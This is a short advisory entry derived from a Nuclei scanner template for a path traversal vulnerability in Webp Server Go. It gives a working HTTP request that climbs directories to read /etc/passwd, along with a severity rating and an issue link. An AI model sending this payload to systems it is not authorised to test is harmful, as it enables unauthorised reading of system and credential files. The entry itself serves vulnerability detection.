# Nuclei Template: Webp Server Go - Path Traversal
**Template ID:** webp-server-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`webp-server-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Webp Server Go has an Path Traversal vulnerability. Attackers can use the vulnerability to access arbitraty file.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../../../../etc/passwd
```

## References
- https://github.com/webp-sh/webp_server_go/issues/92
